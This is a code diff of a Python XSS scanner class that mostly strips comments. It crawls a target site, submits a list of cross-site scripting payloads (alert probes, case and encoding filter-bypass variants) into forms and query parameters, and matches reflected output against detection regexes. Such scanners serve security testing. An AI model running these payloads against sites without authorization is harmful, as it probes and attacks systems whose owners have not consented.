@@ -22,35 +22,28 @@ class XSSScanner(BaseScanner):
         "Detects Cross-Site Scripting (XSS) vulnerabilities in web applications"
     )
 
-    # XSS payloads to test
     PAYLOADS = [
-        # Simple alert payloads
         "<script>alert(1)</script>",
         "<script>alert('XSS')</script>",
         "<img src=x onerror=alert(1)>",
         "<svg onload=alert(1)>",
-        # Bypassing basic filters
-        "<img src=x oneRRor=alert(1)>",  # Case variation
+        "<img src=x oneRRor=alert(1)>",
         "<script>prompt(1)</script>",
         "<script>confirm(1)</script>",
-        "<ScRiPt>alert(1)</ScRiPt>",  # Mixed case
-        "';alert(1);//",  # JavaScript context injection
-        # Event handlers
+        "<ScRiPt>alert(1)</ScRiPt>",
+        "';alert(1);//",
         "<body onload=alert(1)>",
         "<input autofocus onfocus=alert(1)>",
         "<a href=javascript:alert(1)>click me</a>",
-        # Various contexts
-        '"><script>alert(1)</script>',  # Breaking out of attribute
+        '"><script>alert(1)</script>',
         "'><script>alert(1)</script>",
         '<img """><script>alert(1)</script>">',
         '<iframe src="javascript:alert(1)"></iframe>',
-        # Encoded payloads
-        "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",  # Hex encoding
-        "<img src=x onerror=eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')>",  # Unicode escapes
-        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",  # Base64 encoding
+        "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
+        "<img src=x onerror=eval('\\x61\\x6c\\x65\\x72\\x74\\x28\\x31\\x29')>",
+        "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
     ]
 
-    # Patterns to detect XSS
     XSS_DETECTION_PATTERNS = [
         r'<script>alert\((?:1|\'XSS\'|"XSS")\)</script>',
         r'<img[^>]*src\s*=\s*x[^>]*onerror\s*=\s*alert\((?:1|\'XSS\'|"XSS")\)[^>]*>',
@@ -68,15 +61,15 @@ class XSSScanner(BaseScanner):
         self.headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
         }
-        # Keep requests session for fallback
+
         self.session = requests.Session()
         self.max_threads = 10
         self.vulnerable_endpoints = []
         self.tested_urls = set()
         self.logger = logging.getLogger(__name__)
-        # Browser instance
+
         self.browser = None
-        # Form targets provided by coordinator
+
         self.form_targets = []
 
     def scan(self) -> Dict[str, Any]:
@@ -93,28 +86,25 @@ class XSSScanner(BaseScanner):
         """Run XSS scan using the form targets provided by coordinator"""
         self.progress = 10
 
-        # Set cookies if provided
         if self.cookies:
             self._set_cookies()
 
         try:
             self.progress = 20
 
-            # Check if we have form targets from coordinator
             if self.form_targets:
                 self.logger.info(
                     f"Using {len(self.form_targets)} targets provided by coordinator"
                 )
-                # Transform the targets into the format _test_endpoints expects
+
                 endpoints = self._prepare_form_targets()
             else:
-                # Fall back to crawling ourselves if no targets provided
+
                 self.logger.info("No targets from coordinator, crawling website")
                 endpoints = self._crawl_website()
 
             self.progress = 30
 
-            # Test each endpoint for XSS vulnerabilities
             if endpoints:
                 self._test_endpoints(endpoints)
 
@@ -141,13 +131,12 @@ class XSSScanner(BaseScanner):
                 url = target.get("url", "")
                 method = target.get("method", "get").lower()
 
-                # Handle different param formats: list of param names or dict of param values
                 params = target.get("params", {})
                 if isinstance(params, list):
-                    # Convert list of param names to dict with default values
+
                     param_dict = {}
                     for param_name in params:
-                        param_dict[param_name] = "test"  # Default value for testing
+                        param_dict[param_name] = "test"
                     params = param_dict
 
                 if params:
@@ -171,17 +160,15 @@ class XSSScanner(BaseScanner):
         if not self.cookies:
             return
 
-        # Set cookies in requests session
         cookie_pairs = self.cookies.split(";")
         for cookie_pair in cookie_pairs:
             if "=" in cookie_pair:
                 name, value = cookie_pair.strip().split("=", 1)
                 self.session.cookies.set(name, value)
 
-        # Set cookies in browser
         browser = self._get_browser()
         try:
-            # Visit the site once to be able to set cookies for the domain
+
             browser_manager.safe_get(self.target_url)
 
             for cookie_pair in self.cookies.split(";"):
@@ -203,10 +190,10 @@ class XSSScanner(BaseScanner):
         forms_and_inputs = []
         visited_urls = set()
         urls_to_visit = [self.target_url]
-        max_pages = 20  # Limit pages to crawl
+        max_pages = 20
 
         try:
-            # First attempt to use the browser
+
             browser = self._get_browser()
 
             while urls_to_visit and len(visited_urls) < max_pages:
@@ -218,13 +205,13 @@ class XSSScanner(BaseScanner):
                 visited_urls.add(current_url)
 
                 try:
-                    # Try to use the browser first
+
                     success = browser_manager.safe_get(current_url)
 
                     if success:
                         soup = BeautifulSoup(browser.page_source, "html.parser")
                     else:
-                        # Fall back to requests
+
                         self.logger.debug(f"Falling back to requests for {current_url}")
                         response = self.session.get(
                             current_url, headers=self.headers, timeout=10
@@ -235,7 +222,6 @@ class XSSScanner(BaseScanner):
 
                         soup = BeautifulSoup(response.text, "html.parser")
 
-                    # Find forms
                     for form in soup.find_all("form"):
                         form_action = form.get("action", "")
                         form_method = form.get("method", "get").lower()
@@ -257,7 +243,6 @@ class XSSScanner(BaseScanner):
                                 }
                             )
 
-                    # Find URLs with query parameters
                     for link in soup.find_all("a", href=True):
                         href = link["href"]
                         if href.startswith("javascript:") or href.startswith("#"):
@@ -266,21 +251,18 @@ class XSSScanner(BaseScanner):
                         full_url = urllib.parse.urljoin(current_url, href)
                         parsed_url = urllib.parse.urlparse(full_url)
 
-                        # Skip external domains
                         if (
                             urllib.parse.urlparse(self.target_url).netloc
                             != parsed_url.netloc
                         ):
                             continue
 
-                        # Add to URL queue for crawling if not visited
                         if (
                             full_url not in visited_urls
                             and full_url not in urls_to_visit
                         ):
                             urls_to_visit.append(full_url)
 
-                        # If URL has query parameters
                         if parsed_url.query:
                             query_params = dict(
                                 urllib.parse.parse_qsl(parsed_url.query)
@@ -318,7 +300,7 @@ class XSSScanner(BaseScanner):
 
                 for param_name in params.keys():
                     for payload in self.PAYLOADS:
-                        # Create a copy of the parameters
+
                         test_params = params.copy()
                         test_params[param_name] = payload
 
@@ -343,12 +325,11 @@ class XSSScanner(BaseScanner):
                                 )
                             )
 
-            # Wait for all futures to complete
             completed = 0
             for future in futures:
                 future.result()
                 completed += 1
-                # Update progress based on how many tests have completed
+
                 self.progress = 30 + int(60 * (completed / len(futures)))
 
     def _test_get_endpoint(
@@ -363,7 +344,6 @@ class XSSScanner(BaseScanner):
 
             self.tested_urls.add(cache_key)
 
-            # First try with browser for more realistic testing
             browser = self._get_browser()
             try:
                 full_url = f"{url}?{urllib.parse.urlencode(params)}"
@@ -371,7 +351,7 @@ class XSSScanner(BaseScanner):
 
                 if success:
                     content = browser.page_source
-                    # Analyze browser response
+
                     self._analyze_response(
                         {"text": content, "status_code": 200},
                         url,
@@ -385,7 +365,6 @@ class XSSScanner(BaseScanner):
                     f"Browser error for {url}, falling back to requests: {e}"
                 )
 
-            # Fall back to requests
             response = self.session.get(
                 url, params=params, headers=self.headers, timeout=10
             )
@@ -407,14 +386,13 @@ class XSSScanner(BaseScanner):
 
             self.tested_urls.add(cache_key)
 
-            # First try with browser
             browser = self._get_browser()
             try:
-                # Navigate to the form page
+
                 browser_manager.safe_get(url)
 
                 try:
-                    # Fill out the form fields
+
                     for field_name, field_value in data.items():
                         try:
                             input_field = browser.find_element(By.NAME, field_name)
@@ -423,13 +401,11 @@ class XSSScanner(BaseScanner):
                         except Exception as e:
                             self.logger.debug(f"Could not fill field {field_name}: {e}")
 
-                    # Submit the form
                     forms = browser.find_elements(By.TAG_NAME, "form")
                     if forms:
                         forms[0].submit()
                         content = browser.page_source
 
-                        # Analyze browser response
                         self._analyze_response(
                             {"text": content, "status_code": 200},
                             url,
@@ -445,7 +421,6 @@ class XSSScanner(BaseScanner):
                     f"Browser error for POST to {url}, falling back to requests: {e}"
                 )
 
-            # Fall back to requests
             response = self.session.post(
                 url, data=data, headers=self.headers, timeout=10
             )
@@ -460,18 +435,16 @@ class XSSScanner(BaseScanner):
     ):
         """Analyze response for XSS vulnerabilities"""
         try:
-            # Handle both requests Response objects and our custom dict format from browser tests
+
             if hasattr(response, "text"):
                 content = response.text
             else:
                 content = response["text"]
 
-            # 1. Check if payload is reflected in response
             if payload in content:
-                # 2. Check if it's within a context where XSS might execute
+
                 soup = BeautifulSoup(content, "html.parser")
 
-                # Check for exact payload match
                 for pattern in self.XSS_DETECTION_PATTERNS:
                     if re.search(pattern, content, re.IGNORECASE):
                         self._add_vulnerability(
@@ -484,7 +457,6 @@ class XSSScanner(BaseScanner):
                         )
                         return
 
-                # Check if payload is in dangerous contexts
                 if self._check_dangerous_contexts(soup, payload):
                     self._add_vulnerability(
                         url,
@@ -496,7 +468,6 @@ class XSSScanner(BaseScanner):
                     )
                     return
 
-                # It's reflected but not in a clearly executable context
                 self._add_vulnerability(
                     url,
                     method,
@@ -511,25 +482,22 @@ class XSSScanner(BaseScanner):
 
     def _check_dangerous_contexts(self, soup: BeautifulSoup, payload: str) -> bool:
         """Check if payload is in a dangerous context where XSS might execute"""
-        # Check script tags
+
         for script in soup.find_all("script"):
             if payload in script.string:
                 return True
 
-        # Check event handlers in any tag
         for tag in soup.find_all():
             for attr in tag.attrs:
                 if attr.lower().startswith("on") and payload in tag[attr]:
                     return True
 
-        # Check href attributes
         for a_tag in soup.find_all("a", href=True):
             if payload in a_tag["href"] and a_tag["href"].lower().startswith(
                 "javascript:"
             ):
                 return True
 
-        # Check src attributes
         for tag in soup.find_all(["img", "iframe"]):
             if tag.has_attr("src") and payload in tag["src"]:
                 return True
@@ -546,19 +514,16 @@ class XSSScanner(BaseScanner):
         details: str,
     ):
         """Add a vulnerability to the list if not already present"""
-        # Check if we already have this vulnerability
+
         for vuln in self.vulnerable_endpoints:
             if vuln["url"] == url and vuln["parameter"] == param_name:
                 if severity == "high" and vuln["severity"] != "high":
-                    # Upgrade severity if needed
+
                     vuln["severity"] = severity
-                    vuln["payload"] = (
-                        payload  # Update payload to the one that caused high severity
-                    )
+                    vuln["payload"] = payload
                     vuln["details"] = details
                 return
 
-        # Add new vulnerability
         vulnerability = {
             "url": url,
             "method": method,
